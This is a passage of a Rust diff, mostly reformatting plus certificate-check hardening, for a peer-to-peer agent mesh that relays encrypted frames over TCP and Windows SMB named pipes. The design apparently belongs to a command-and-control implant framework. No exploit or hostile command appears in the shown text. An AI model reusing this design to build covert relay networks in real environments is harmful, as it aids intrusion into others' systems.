-                "unsupported transport for RouteUpdate"
-            ));
+            return Err(anyhow::anyhow!("unsupported transport for RouteUpdate"));
         }
     }
     Ok(())
@@ -1538,9 +1847,7 @@ async fn send_route_probe(link: &mut P2pLink, destination: u32) -> anyhow::Resul
             nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
         }
         _ => {
-            return Err(anyhow::anyhow!(
-                "unsupported transport for RouteProbe"
-            ));
+            return Err(anyhow::anyhow!("unsupported transport for RouteProbe"));
         }
     }
     Ok(())
@@ -1613,7 +1920,12 @@ pub fn handle_route_probe_reply(
         .map_err(|e| anyhow::anyhow!("failed to deserialize RouteProbeReply: {e}"))?;
 
     let hop_count = entry.hop_count.saturating_add(1);
-    mesh.update_route(entry.destination, link_id, hop_count, entry.route_quality * 0.95);
+    mesh.update_route(
+        entry.destination,
+        link_id,
+        hop_count,
+        entry.route_quality * 0.95,
+    );
 
     log::debug!(
         "RouteProbeReply from link {:#010X}: dest={:#010X}, hop_count={hop_count}",
@@ -1644,12 +1956,14 @@ pub async fn handle_peer_discovery(
         .map_err(|e| anyhow::anyhow!("failed to deserialize PeerDiscovery: {e}"))?;
 
     let mut results = Vec::new();
+    let auth = mesh.auth_context()?;
 
     for target in targets {
         // Skip if already connected to this agent.
-        let already_connected = mesh.links.values().any(|l| {
-            l.state.is_usable() && l.peer_agent_id == target.agent_id
-        });
+        let already_connected = mesh
+            .links
+            .values()
+            .any(|l| l.state.is_usable() && l.peer_agent_id == target.agent_id);
         if already_connected {
             log::info!(
                 "PeerDiscovery: already connected to '{}', skipping",
@@ -1679,7 +1993,7 @@ pub async fn handle_peer_discovery(
                 #[cfg(feature = "p2p-tcp")]
                 {
                     let (host, port) = parse_host_port(&target.address)?;
-                    match tcp_transport::connect(&host, port, &mesh.agent_id, link_id).await {
+                    match tcp_transport::connect(&host, port, &auth, link_id).await {
                         Ok(tcp_transport::ConnectResult::Connected(mut link)) => {
                             // Override the link type to Peer.
                             link.link_type = LinkType::Peer;
@@ -1701,16 +2015,18 @@ pub async fn handle_peer_discovery(
                             spawn_child_relay(lid, mesh_arc.clone(), outbound_tx.clone());
                             log::info!(
                                 "PeerDiscovery: connected to '{}' via TCP peer link {:#010X}",
-                                agent_id, lid
+                                agent_id,
+                                lid
                             );
                             Ok(lid)
                         }
-                        Ok(tcp_transport::ConnectResult::Rejected { reason, description }) => {
-                            Err(anyhow::anyhow!(
-                                "peer '{}' rejected link: {description} (reason={reason:#04X})",
-                                agent_id
-                            ))
-                        }
+                        Ok(tcp_transport::ConnectResult::Rejected {
+                            reason,
+                            description,
+                        }) => Err(anyhow::anyhow!(
+                            "peer '{}' rejected link: {description} (reason={reason:#04X})",
+                            agent_id
+                        )),
                         Err(e) => Err(anyhow::anyhow!(
                             "peer '{}' TCP connect failed: {e}",
                             agent_id
@@ -1727,9 +2043,9 @@ pub async fn handle_peer_discovery(
                 #[cfg(all(windows, feature = "smb-pipe-transport"))]
                 {
                     let addr_owned = target.address.clone();
-                    let my_id = mesh.agent_id.clone();
+                    let auth = auth.clone();
                     let result = tokio::task::spawn_blocking(move || {
-                        nt_pipe_server::connect(&addr_owned, &my_id, link_id)
+                        nt_pipe_server::connect(&addr_owned, &auth, link_id)
                     })
                     .await
                     .map_err(|e| anyhow::anyhow!("p2p-pipe connect task panicked: {e}"))??;
@@ -1755,16 +2071,18 @@ pub async fn handle_peer_discovery(
                             spawn_child_relay(lid, mesh_arc.clone(), outbound_tx.clone());
                             log::info!(
                                 "PeerDiscovery: connected to '{}' via SMB peer link {:#010X}",
-                                agent_id, lid
+                                agent_id,
+                                lid
                             );
                             Ok(lid)
                         }
-                        nt_pipe_server::ConnectResult::Rejected { reason, description } => {
-                            Err(anyhow::anyhow!(
-                                "peer '{}' rejected SMB link: {description} (reason={reason:#04X})",
-                                agent_id
-                            ))
-                        }
+                        nt_pipe_server::ConnectResult::Rejected {
+                            reason,
+                            description,
+                        } => Err(anyhow::anyhow!(
+                            "peer '{}' rejected SMB link: {description} (reason={reason:#04X})",
+                            agent_id
+                        )),
                     }
                 }
                 #[cfg(not(all(windows, feature = "smb-pipe-transport")))]
@@ -1818,9 +2136,7 @@ async fn send_bandwidth_probe(link: &mut P2pLink) -> anyhow::Result<Instant> {
             nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
         }
         _ => {
-            return Err(anyhow::anyhow!(
-                "unsupported transport for BandwidthProbe"
-            ));
+            return Err(anyhow::anyhow!("unsupported transport for BandwidthProbe"));
         }
     }
 
@@ -1834,7 +2150,9 @@ pub async fn handle_bandwidth_probe(
     link_id: u32,
     decrypted_payload: &[u8],
 ) -> anyhow::Result<()> {
-    let key = mesh.links.get(&link_id)
+    let key = mesh
+        .links
+        .get(&link_id)
         .ok_or_else(|| anyhow::anyhow!("handle_bandwidth_probe: unknown link {link_id:#010X}"))?
         .ecdh_shared_secret;
     // Re-encrypt the already-decrypted probe and echo back.
@@ -1876,10 +2194,7 @@ pub async fn handle_bandwidth_probe(
 /// the parent link.  This is used in addition to the `Message::P2pLinkFailureReport`
 /// sent through the outbound channel.
 #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
-async fn send_link_failure_report(
-    mesh: &mut P2pMesh,
-    dead_link: &P2pLink,
-) -> anyhow::Result<()> {
+async fn send_link_failure_report(mesh: &mut P2pMesh, dead_link: &P2pLink) -> anyhow::Result<()> {
     // The primary failure reporting path is through the outbound channel
     // as Message::P2pLinkFailureReport (handled in the heartbeat task).
     // This function is kept as a hook for future direct peer-to-peer
@@ -1899,7 +2214,8 @@ impl P2pMesh {
     /// If multiple routes have similar quality (within 10%), distributes
     /// traffic using a simple weighted round-robin counter.
     pub fn select_relay_hop(&self, destination: u32) -> Option<u32> {
-        let routes: Vec<&common::p2p_proto::RouteEntry> = self.routing_table
+        let routes: Vec<&common::p2p_proto::RouteEntry> = self
+            .routing_table
             .values()
             .filter(|e| e.destination == destination)
             .collect();
@@ -1923,7 +2239,10 @@ impl P2pMesh {
             .collect();
 
         // Find the best score.
-        let best_score = scored.iter().map(|(s, _)| *s).fold(f32::NEG_INFINITY, f32::max);
+        let best_score = scored
+            .iter()
+            .map(|(s, _)| *s)
+            .fold(f32::NEG_INFINITY, f32::max);
 
         // Collect all routes within 10% of the best score.
         let threshold = best_score * 0.9;
@@ -1946,7 +2265,8 @@ impl P2pMesh {
 
     /// Return all routes to a specific destination, sorted by quality score.
     pub fn routes_to(&self, destination: u32) -> Vec<common::p2p_proto::RouteEntry> {
-        let mut routes: Vec<common::p2p_proto::RouteEntry> = self.routing_table
+        let mut routes: Vec<common::p2p_proto::RouteEntry> = self
+            .routing_table
             .values()
             .filter(|e| e.destination == destination)
             .cloned()
@@ -1955,7 +2275,9 @@ impl P2pMesh {
         routes.sort_by(|a, b| {
             let score_a = a.route_quality * 0.7 + (1.0 / a.hop_count.max(1) as f32) * 0.3;
             let score_b = b.route_quality * 0.7 + (1.0 / b.hop_count.max(1) as f32) * 0.3;
-            score_b.partial_cmp(&score_a).unwrap_or(std::cmp::Ordering::Equal)
+            score_b
+                .partial_cmp(&score_a)
+                .unwrap_or(std::cmp::Ordering::Equal)
         });
 
         routes
@@ -1967,7 +2289,8 @@ impl P2pMesh {
         let mut modified = Vec::new();
 
         // Collect link IDs and pending sizes first.
-        let link_info: Vec<(u32, usize)> = self.links
+        let link_info: Vec<(u32, usize)> = self
+            .links
             .iter()
             .map(|(&id, link)| (id, link.pending_forwards.iter().map(|v| v.len()).sum()))
             .collect();
@@ -1975,7 +2298,8 @@ impl P2pMesh {
         for (link_id, pending_bytes) in link_info {
             if let Some(link) = self.links.get_mut(&link_id) {
                 // Find any routing table entries using this link as next_hop.
-                let affected_routes: Vec<u32> = self.routing_table
+                let affected_routes: Vec<u32> = self
+                    .routing_table
                     .iter()
                     .filter(|(_, entry)| entry.next_hop == link_id)
                     .map(|(dest, _)| *dest)
@@ -2193,88 +2517,38 @@ impl P2pMesh {
         peer_agent_id: &str,
         now: u64,
     ) -> Result<(), String> {
-        // Check expiry.
-        if cert.is_expired(now) {
-            return Err(format!(
-                "mesh certificate expired (expires_at={})",
-                cert.expires_at
-            ));
-        }
-
-        // Check revocation list.
-        if self.revoked_agents.contains(&cert.agent_id_hash) {
-            return Err("mesh certificate has been revoked".to_string());
-        }
-
-        // Verify the agent_id_hash matches the claimed peer identity.
-        let expected_hash = common::hash_agent_id(peer_agent_id);
-        if cert.agent_id_hash != expected_hash {
-            return Err("mesh certificate agent_id_hash mismatch".to_string());
-        }
-
-        // Reject certificates with an all-zeros public key — these are
-        // PSK-only placeholders that do not bind to any real Ed25519 key.
-        // Accepting them would allow any agent to impersonate any other
-        // agent in the P2P mesh.
-        if cert.public_key == [0u8; 32] {
-            return Err(
-                "mesh certificate has all-zeros public_key (PSK-only cert, \
-                 no P2P identity binding — peer may be spoofed)"
-                    .to_string(),
-            );
-        }
-
-        // Verify Ed25519 signature (if we have the server's public key).
-        if let Some(ref server_pk) = self.server_ed25519_public_key {
-            #[cfg(feature = "module-signatures")]
-            {
-                if let Err(e) = common::verify_mesh_certificate(cert, server_pk, now) {
-                    return Err(format!("mesh certificate signature invalid: {e}"));
-                }
-            }
-            #[cfg(not(feature = "module-signatures"))]
-            {
-                let _ = (server_pk, now);
-                log::warn!(
-                    "mesh certificate signature verification skipped: \
-                     module-signatures feature not enabled"
-                );
-            }
-        } else {
-            log::warn!(
-                "mesh certificate signature verification skipped: \
-                 no server Ed25519 public key configured"
-            );
-        }
-
-        // Check compartment match.
-        if let Some(ref our_compartment) = self.compartment {
-            match &cert.compartment {
-                Some(their_compartment) if their_compartment == our_compartment => {}
-                Some(their_compartment) => {
-                    return Err(format!(
-                        "compartment mismatch: ours={our_compartment}, theirs={their_compartment}"
-                    ));
-                }
-                None => {
-                    return Err(format!(
-                        "peer has no compartment but we require compartment '{our_compartment}'"
-                    ));
-                }
-            }
-        }
-
-        Ok(())
+        verify_peer_certificate_material(
+            self.server_ed25519_public_key.as_ref(),
+            &self.revoked_agents,
+            self.compartment.as_deref(),
+            cert,
+            peer_agent_id,
+            now,
+        )
     }
 
     /// Store the server-issued mesh certificate for this agent.
-    pub fn store_mesh_certificate(&mut self, cert: common::MeshCertificate) {
+    pub fn store_mesh_certificate(&mut self, cert: common::MeshCertificate) -> Result<(), String> {
+        if !self.agent_id.is_empty() && cert.agent_id_hash != common::hash_agent_id(&self.agent_id)
+        {
+            return Err("mesh certificate does not match local agent_id".to_string());
+        }
+        if let Some(public_key) = self.mesh_public_key {
+            if cert.public_key != public_key {
+                return Err("mesh certificate public key does not match local identity".to_string());
+            }
+        }
+        if cert.is_expired(unix_now_secs()) {
+            return Err("mesh certificate is already expired".to_string());
+        }
+
         log::info!(
             "mesh certificate stored: expires_at={}, compartment={:?}",
             cert.expires_at,
             cert.compartment,
         );
         self.mesh_certificate = Some(cert);
+        Ok(())
     }
 
     /// Verify that the peer's Ed25519 public key matches the one bound in
@@ -2293,10 +2567,7 @@ impl P2pMesh {
             return Err(format!(
                 "peer Ed25519 public key does not match mesh certificate: \
                  cert={:02x}{:02x}... peer={:02x}{:02x}...",
-                cert.public_key[0],
-                cert.public_key[1],
-                peer_public_key[0],
-                peer_public_key[1],
+                cert.public_key[0], cert.public_key[1], peer_public_key[0], peer_public_key[1],
             ));
         }
         Ok(())
@@ -2308,10 +2579,7 @@ impl P2pMesh {
     /// active links to the revoked agent.
     ///
     /// Returns a list of link IDs that were terminated.
-    pub fn handle_certificate_revocation(
-        &mut self,
-        revoked_hash: [u8; 32],
-    ) -> Vec<u32> {
+    pub fn handle_certificate_revocation(&mut self, revoked_hash: [u8; 32]) -> Vec<u32> {
         log::warn!(
             "mesh certificate revocation received for agent hash {:02x?}…",
             &revoked_hash[..8]
@@ -2335,7 +2603,8 @@ impl P2pMesh {
             if let Some(link) = self.links.get_mut(&id) {
                 log::warn!(
                     "terminating link {:#010X} to revoked agent '{}'",
-                    id, link.peer_agent_id
+                    id,
+                    link.peer_agent_id
                 );
                 let _ = link.transition(LinkState::Dead);
                 terminated.push(id);
@@ -2350,15 +2619,12 @@ impl P2pMesh {
     ///
     /// Marks the peer as quarantined, stops relaying data through it,
     /// and optionally sends a QuarantineReport to the server.
-    pub fn quarantine_peer(
-        &mut self,
-        target_agent_id: &str,
-        reason: u8,
-    ) -> Result<(), String> {
+    pub fn quarantine_peer(&mut self, target_agent_id: &str, reason: u8) -> Result<(), String> {
         let target_hash = common::hash_agent_id(target_agent_id);
         log::warn!(
             "quarantining agent '{}' (reason={})",
-            target_agent_id, reason
+            target_agent_id,
+            reason
         );
 
         self.quarantined_agents.insert(target_hash);
@@ -2376,7 +2642,8 @@ impl P2pMesh {
                 link.quarantined = true;
                 log::info!(
                     "link {:#010X} to '{}' marked as quarantined",
-                    id, target_agent_id
+                    id,
+                    target_agent_id
                 );
             }
         }
@@ -2471,9 +2738,10 @@ impl P2pMesh {
     /// must send it), or an error if the link doesn't exist or rotation
     /// is already in progress.
     pub fn initiate_key_rotation(&mut self, link_id: u32) -> Result<[u8; 32], String> {
-        let link = self.links.get_mut(&link_id).ok_or_else(|| {
-            format!("initiate_key_rotation: link {:#010X} not found", link_id)
-        })?;
+        let link = self
+            .links
+            .get_mut(&link_id)
+            .ok_or_else(|| format!("initiate_key_rotation: link {:#010X} not found", link_id))?;
 
         if link.key_rotation_in_progress {
             return Err(format!(
@@ -2496,10 +2764,9 @@ impl P2pMesh {
         // Set rotation state.
         link.key_rotation_in_progress = true;
         link.key_rotation_started = Some(Instant::now());
-        link.rotation_overlap_deadline =
-            Some(Instant::now() + Duration::from_secs(
-                common::p2p_proto::KEY_ROTATION_OVERLAP_SECS,
-            ));
+        link.rotation_overlap_deadline = Some(
+            Instant::now() + Duration::from_secs(common::p2p_proto::KEY_ROTATION_OVERLAP_SECS),
+        );
 
         // Store the new secret for the final DH when KeyRotationAck arrives.
         link.pending_rotation_secret = Some(new_secret_bytes);
@@ -2508,7 +2775,8 @@ impl P2pMesh {
 
         log::info!(
             "key rotation initiated on link {:#010X} (peer={})",
-            link_id, link.peer_agent_id
+            link_id,
+            link.peer_agent_id
         );
 
         Ok(new_public_bytes)
@@ -2531,9 +2799,10 @@ impl P2pMesh {
         let data = KeyRotationData::from_bytes(payload)
             .map_err(|e| format!("KeyRotation parse error: {e}"))?;
 
-        let link = self.links.get_mut(&link_id).ok_or_else(|| {
-            format!("handle_key_rotation: link {:#010X} not found", link_id)
-        })?;
+        let link = self
+            .links
+            .get_mut(&link_id)
+            .ok_or_else(|| format!("handle_key_rotation: link {:#010X} not found", link_id))?;
 
         // Generate our own new ephemeral.
         let our_new_secret = x25519_dalek::EphemeralSecret::random_from_rng(rand::thread_rng());
@@ -2550,10 +2819,9 @@ impl P2pMesh {
         // Apply the new key.
         link.ecdh_shared_secret = new_key;
         link.key_rotation_in_progress = true;
-        link.rotation_overlap_deadline =
-            Some(Instant::now() + Duration::from_secs(
-                common::p2p_proto::KEY_ROTATION_OVERLAP_SECS,
-            ));
+        link.rotation_overlap_deadline = Some(
+            Instant::now() + Duration::from_secs(common::p2p_proto::KEY_ROTATION_OVERLAP_SECS),
+        );
         link.last_key_rotation = Instant::now();
         link.key_rotation_retries = 0;
         link.key_rotation_started = None;
@@ -2562,7 +2830,8 @@ impl P2pMesh {
 
         log::info!(
             "key rotation completed (responder side) on link {:#010X} (peer={})",
-            link_id, link.peer_agent_id
+            link_id,
+            link.peer_agent_id
         );
 
         Ok(our_new_public_bytes)
@@ -2574,19 +2843,16 @@ impl P2pMesh {
     /// new public key.  We derive the final shared secret and apply it.
     ///
     /// Returns `Ok(())` on success.
-    pub fn handle_key_rotation_ack(
-        &mut self,
-        link_id: u32,
-        payload: &[u8],
-    ) -> Result<(), String> {
+    pub fn handle_key_rotation_ack(&mut self, link_id: u32, payload: &[u8]) -> Result<(), String> {
         use common::p2p_proto::KeyRotationAckData;
 
         let data = KeyRotationAckData::from_bytes(payload)
             .map_err(|e| format!("KeyRotationAck parse error: {e}"))?;
 
-        let link = self.links.get_mut(&link_id).ok_or_else(|| {
-            format!("handle_key_rotation_ack: link {:#010X} not found", link_id)
-        })?;
+        let link = self
+            .links
+            .get_mut(&link_id)
+            .ok_or_else(|| format!("handle_key_rotation_ack: link {:#010X} not found", link_id))?;
 
         // Retrieve the secret we stored during initiate_key_rotation.
         let secret_bytes = link.pending_rotation_secret.take().ok_or_else(|| {
@@ -2611,7 +2877,8 @@ impl P2pMesh {
 
         log::info!(
             "key rotation completed (initiator side) on link {:#010X} (peer={})",
-            link_id, link.peer_agent_id
+            link_id,
+            link.peer_agent_id
         );
 
         Ok(())
@@ -2677,7 +2944,8 @@ impl P2pMesh {
                         } else {
                             log::warn!(
                                 "key rotation on link {:#010X} timed out (attempt {}), will retry",
-                                id, link.key_rotation_retries
+                                id,
+                                link.key_rotation_retries
                             );
                             // Reset rotation state for retry.
                             link.key_rotation_in_progress = false;
@@ -2817,7 +3085,8 @@ pub fn spawn_child_relay(
                 Err(e) => {
                     log::warn!(
                         "child relay: read error on {:#010X}: {} — exiting",
-                        link_id, e
+                        link_id,
+                        e
                     );
                     let mut mesh_guard = mesh.lock().await;
                     if let Some(link) = mesh_guard.links.get_mut(&link_id) {
@@ -2861,10 +3130,7 @@ pub fn spawn_child_relay(
                     let plaintext = match decrypt_payload(&key, &frame.payload) {
                         Ok(p) => p,
                         Err(e) => {
-                            log::warn!(
-                                "child relay: decrypt error on {:#010X}: {}",
-                                link_id, e
-                            );
+                            log::warn!("child relay: decrypt error on {:#010X}: {}", link_id, e);
                             continue;
                         }
                     };
@@ -2892,7 +3158,8 @@ pub fn spawn_child_relay(
                         Err(e) => {
                             log::warn!(
                                 "child relay: mesh decrypt error on {:#010X}: {}",
-                                link_id, e
+                                link_id,
+                                e
                             );
                             continue;
                         }
@@ -2944,16 +3211,20 @@ pub fn spawn_child_relay(
                                         }
                                         #[cfg(all(windows, feature = "smb-pipe-transport"))]
                                         P2pTransport::SmbPipe(ref pipe) => {
-                                            encrypt_payload(&key, &fwd_frame.payload).and_then(|encrypted| {
-                                                let enc_frame = P2pFrame {
-                                                    frame_type: P2pFrameType::MeshDataForward,
-                                                    link_id: next_link_id,
-                                                    sequence: 0,
-                                                    payload_len: encrypted.len() as u32,
-                                                    payload: encrypted,
-                                                };
-                                                nt_pipe_server::NtPipeHandle::write_frame(pipe, &enc_frame)
-                                            })
+                                            encrypt_payload(&key, &fwd_frame.payload).and_then(
+                                                |encrypted| {
+                                                    let enc_frame = P2pFrame {
+                                                        frame_type: P2pFrameType::MeshDataForward,
+                                                        link_id: next_link_id,
+                                                        sequence: 0,
+                                                        payload_len: encrypted.len() as u32,
+                                                        payload: encrypted,
+                                                    };
+                                                    nt_pipe_server::NtPipeHandle::write_frame(
+                                                        pipe, &enc_frame,
+                                                    )
+                                                },
+                                            )
                                         }
                                         _ => Err(anyhow::anyhow!("unsupported transport")),
                                     };
@@ -2961,7 +3232,8 @@ pub fn spawn_child_relay(
                                     if let Err(e) = res {
                                         log::warn!(
                                             "child relay: mesh forward to {:#010X} failed: {}",
-                                            next_link_id, e
+                                            next_link_id,
+                                            e
                                         );
                                     }
                                 }
@@ -2982,7 +3254,9 @@ pub fn spawn_child_relay(
                             drop(mesh_guard);
                             log::warn!(
                                 "child relay: route too deep {} -> {} ({} hops)",
-                                origin, destination, hop_count
+                                origin,
+                                destination,
+                                hop_count
                             );
                             let msg = common::Message::P2pRouteTooDeep {
                                 destination,
@@ -3021,8 +3295,7 @@ pub fn spawn_child_relay(
                             | P2pFrameType::CertificateRevocation
                             | P2pFrameType::QuarantineReport
                     ) {
-                        let payload = decrypt_payload(&key, &frame.payload)
-                            .unwrap_or_default();
+                        let payload = decrypt_payload(&key, &frame.payload).unwrap_or_default();
                         P2pFrame {
                             frame_type: frame.frame_type,
                             link_id: frame.link_id,
@@ -3041,10 +3314,8 @@ pub fn spawn_child_relay(
                     // &mut P2pMesh but cannot write frames).
                     match decrypted_frame.frame_type {
                         P2pFrameType::KeyRotation => {
-                            match mesh_guard.handle_key_rotation(
-                                link_id,
-                                &decrypted_frame.payload,
-                            ) {
+                            match mesh_guard.handle_key_rotation(link_id, &decrypted_frame.payload)
+                            {
                                 Ok(responder_new_pubkey) => {
                                     // Build KeyRotationAck, encrypt with
                                     // the OLD key (captured before handle_key_rotation
@@ -3073,18 +3344,20 @@ pub fn spawn_child_relay(
                                         }
                                         #[cfg(all(windows, feature = "smb-pipe-transport"))]
                                         P2pTransport::SmbPipe(ref pipe) => {
-                                            encrypt_payload(&key, &ack_frame.payload).and_then(|encrypted| {
-                                                let enc_frame = P2pFrame {
-                                                    frame_type: P2pFrameType::KeyRotationAck,
-                                                    link_id,
-                                                    sequence: 0,
-                                                    payload_len: encrypted.len() as u32,
-                                                    payload: encrypted,
-                                                };
-                                                nt_pipe_server::NtPipeHandle::write_frame(
-                                                    pipe, &enc_frame,
-                                                )
-                                            })
+                                            encrypt_payload(&key, &ack_frame.payload).and_then(
+                                                |encrypted| {
+                                                    let enc_frame = P2pFrame {
+                                                        frame_type: P2pFrameType::KeyRotationAck,
+                                                        link_id,
+                                                        sequence: 0,
+                                                        payload_len: encrypted.len() as u32,
+                                                        payload: encrypted,
+                                                    };
+                                                    nt_pipe_server::NtPipeHandle::write_frame(
+                                                        pipe, &enc_frame,
+                                                    )
+                                                },
+                                            )
                                         }
                                         _ => Err(anyhow::anyhow!("unsupported transport")),
                                     };
@@ -3098,16 +3371,16 @@ pub fn spawn_child_relay(
                                 Err(e) => {
                                     log::warn!(
                                         "child relay: KeyRotation error on {:#010X}: {}",
-                                        link_id, e
+                                        link_id,
+                                        e
                                     );
                                 }
                             }
                         }
                         P2pFrameType::KeyRotationAck => {
-                            match mesh_guard.handle_key_rotation_ack(
-                                link_id,
-                                &decrypted_frame.payload,
-                            ) {
+                            match mesh_guard
+                                .handle_key_rotation_ack(link_id, &decrypted_frame.payload)
+                            {
                                 Ok(()) => {
                                     log::info!(
                                         "child relay: key rotation completed on {:#010X}",
@@ -3117,21 +3390,18 @@ pub fn spawn_child_relay(
                                 Err(e) => {
                                     log::warn!(
                                         "child relay: KeyRotationAck error on {:#010X}: {}",
-                                        link_id, e
+                                        link_id,
+                                        e
                                     );
                                 }
                             }
                         }
                         P2pFrameType::CertificateRevocation => {
                             use common::p2p_proto::CertificateRevocationData;
-                            match CertificateRevocationData::from_bytes(
-                                &decrypted_frame.payload,
-                            ) {
+                            match CertificateRevocationData::from_bytes(&decrypted_frame.payload) {
                                 Ok(data) => {
-                                    let terminated =
-                                        mesh_guard.handle_certificate_revocation(
-                                            data.revoked_agent_id_hash,
-                                        );
+                                    let terminated = mesh_guard
+                                        .handle_certificate_revocation(data.revoked_agent_id_hash);
                                     if !terminated.is_empty() {
                                         log::info!(
                                             "child relay: cert revocation terminated {} links on {:#010X}",
@@ -3155,9 +3425,7 @@ pub fn spawn_child_relay(
                         }
                         P2pFrameType::QuarantineReport => {
                             use common::p2p_proto::QuarantineReportData;
-                            match QuarantineReportData::from_bytes(
-                                &decrypted_frame.payload,
-                            ) {
+                            match QuarantineReportData::from_bytes(&decrypted_frame.payload) {
                                 Ok(data) => {
                                     log::info!(
                                         "child relay: quarantine report from {:#010X}",
@@ -3174,7 +3442,8 @@ pub fn spawn_child_relay(
                                 Err(e) => {
                                     log::warn!(
                                         "child relay: QuarantineReport parse error on {:#010X}: {}",
-                                        link_id, e
+                                        link_id,
+                                        e
                                     );
                                 }
                             }
@@ -3185,7 +3454,8 @@ pub fn spawn_child_relay(
                                 &mut mesh_guard,
                                 &decrypted_frame,
                                 &outbound_tx,
-                            ).await;
+                            )
+                            .await;
                         }
                     }
                 }
@@ -3254,7 +3524,8 @@ async fn handle_control_frame_inner(
         _ => {
             log::debug!(
                 "unhandled frame type {:?} on link {:#010X}",
-                frame.frame_type, link_id
+                frame.frame_type,
+                link_id
             );
         }
     }
@@ -3293,9 +3564,7 @@ pub fn spawn_parent_reader(
                 match mesh_guard.parent_link_id {
                     Some(id) => id,
                     None => {
-                        log::info!(
-                            "parent reader: no parent link in mesh, exiting"
-                        );
+                        log::info!("parent reader: no parent link in mesh, exiting");
                         return;
                     }
                 }
@@ -3309,7 +3578,8 @@ pub fn spawn_parent_reader(
                     Some(l) => {
                         log::warn!(
                             "parent reader: parent link {:#010X} is {:?}, exiting",
-                            parent_link_id, l.state
+                            parent_link_id,
+                            l.state
                         );
                         return;
                     }
@@ -3329,7 +3599,8 @@ pub fn spawn_parent_reader(
                 Err(e) => {
                     log::warn!(
                         "parent reader: read error on parent {:#010X}: {} — exiting",
-                        parent_link_id, e
+                        parent_link_id,
+                        e
                     );
                     let mut mesh_guard = mesh.lock().await;
                     if let Some(link) = mesh_guard.links.get_mut(&parent_link_id) {
@@ -3375,7 +3646,8 @@ pub fn spawn_parent_reader(
                         Err(e) => {
                             log::warn!(
                                 "parent reader: decrypt error on {:#010X}: {}",
-                                parent_link_id, e
+                                parent_link_id,
+                                e
                             );
                             continue;
                         }
@@ -3392,26 +3664,21 @@ pub fn spawn_parent_reader(
                                 plaintext.len()
                             );
                             if inbound_tx.send(msg).await.is_err() {
-                                log::warn!(
-                                    "parent reader: inbound channel closed, exiting"
-                                );
+                                log::warn!("parent reader: inbound channel closed, exiting");
                                 return;
                             }
                         }
                         Err(e) => {
                             // If we can't parse it as a Message, it might be
                             // a routing blob for a grandchild.
-                            if let Ok((child_link_id, payload)) =
-                                parse_p2p_routing_blob(&plaintext)
+                            if let Ok((child_link_id, payload)) = parse_p2p_routing_blob(&plaintext)
                             {
                                 let msg = common::Message::P2pToChild {
                                     child_link_id,
                                     data: payload,
                                 };
                                 if inbound_tx.send(msg).await.is_err() {
-                                    log::warn!(
-                                        "parent reader: inbound channel closed, exiting"
-                                    );
+                                    log::warn!("parent reader: inbound channel closed, exiting");
                                     return;
                                 }
                             } else {
@@ -3438,7 +3705,8 @@ pub fn spawn_parent_reader(
                         Err(e) => {
                             log::warn!(
                                 "parent reader: mesh decrypt error on {:#010X}: {}",
-                                parent_link_id, e
+                                parent_link_id,
+                                e
                             );
                             continue;
                         }
@@ -3493,16 +3761,20 @@ pub fn spawn_parent_reader(
                                         }
                                         #[cfg(all(windows, feature = "smb-pipe-transport"))]
                                         P2pTransport::SmbPipe(ref pipe) => {
-                                            encrypt_payload(&key, &fwd_frame.payload).and_then(|encrypted| {
-                                                let enc_frame = P2pFrame {
-                                                    frame_type: P2pFrameType::MeshDataForward,
-                                                    link_id: next_link_id,
-                                                    sequence: 0,
-                                                    payload_len: encrypted.len() as u32,
-                                                    payload: encrypted,
-                                                };
-                                                nt_pipe_server::NtPipeHandle::write_frame(pipe, &enc_frame)
-                                            })
+                                            encrypt_payload(&key, &fwd_frame.payload).and_then(
+                                                |encrypted| {
+                                                    let enc_frame = P2pFrame {
+                                                        frame_type: P2pFrameType::MeshDataForward,
+                                                        link_id: next_link_id,
+                                                        sequence: 0,
+                                                        payload_len: encrypted.len() as u32,
+                                                        payload: encrypted,
+                                                    };
+                                                    nt_pipe_server::NtPipeHandle::write_frame(
+                                                        pipe, &enc_frame,
+                                                    )
+                                                },
+                                            )
                                         }
                                         _ => Err(anyhow::anyhow!("unsupported transport")),
                                     };
@@ -3510,7 +3782,8 @@ pub fn spawn_parent_reader(
                                     if let Err(e) = res {
                                         log::warn!(
                                             "parent reader: mesh forward to {:#010X} failed: {}",
-                                            next_link_id, e
+                                            next_link_id,
+                                            e
                                         );
                                     }
                                 }
@@ -3531,7 +3804,9 @@ pub fn spawn_parent_reader(
                             drop(mesh_guard);
                             log::warn!(
                                 "parent reader: route too deep {} -> {} ({} hops)",
-                                origin, destination, hop_count
+                                origin,
+                                destination,
+                                hop_count
                             );
                             // Cannot easily send RouteTooDeep back to origin
                             // from the parent reader — just log for now.
@@ -3563,8 +3838,7 @@ pub fn spawn_parent_reader(
                             | P2pFrameType::CertificateRevocation
                             | P2pFrameType::QuarantineReport
                     ) {
-                        let payload = decrypt_payload(&key, &frame.payload)
-                            .unwrap_or_default();
+                        let payload = decrypt_payload(&key, &frame.payload).unwrap_or_default();
                         P2pFrame {
                             frame_type: frame.frame_type,
                             link_id: frame.link_id,
@@ -3579,10 +3853,9 @@ pub fn spawn_parent_reader(
                     // Dispatch security-related control frames directly.
                     match decrypted_frame.frame_type {
                         P2pFrameType::KeyRotation => {
-                            match mesh_guard.handle_key_rotation(
-                                parent_link_id,
-                                &decrypted_frame.payload,
-                            ) {
+                            match mesh_guard
+                                .handle_key_rotation(parent_link_id, &decrypted_frame.payload)
+                            {
                                 Ok(responder_new_pubkey) => {
                                     use common::p2p_proto::KeyRotationAckData;
                                     let ack_data = KeyRotationAckData {
@@ -3608,18 +3881,20 @@ pub fn spawn_parent_reader(
                                         }
                                         #[cfg(all(windows, feature = "smb-pipe-transport"))]
                                         P2pTransport::SmbPipe(ref pipe) => {
-                                            encrypt_payload(&key, &ack_frame.payload).and_then(|encrypted| {
-                                                let enc_frame = P2pFrame {
-                                                    frame_type: P2pFrameType::KeyRotationAck,
-                                                    link_id: parent_link_id,
-                                                    sequence: 0,
-                                                    payload_len: encrypted.len() as u32,
-                                                    payload: encrypted,
-                                                };
-                                                nt_pipe_server::NtPipeHandle::write_frame(
-                                                    pipe, &enc_frame,
-                                                )
-                                            })
+                                            encrypt_payload(&key, &ack_frame.payload).and_then(
+                                                |encrypted| {
+                                                    let enc_frame = P2pFrame {
+                                                        frame_type: P2pFrameType::KeyRotationAck,
+                                                        link_id: parent_link_id,
+                                                        sequence: 0,
+                                                        payload_len: encrypted.len() as u32,
+                                                        payload: encrypted,
+                                                    };
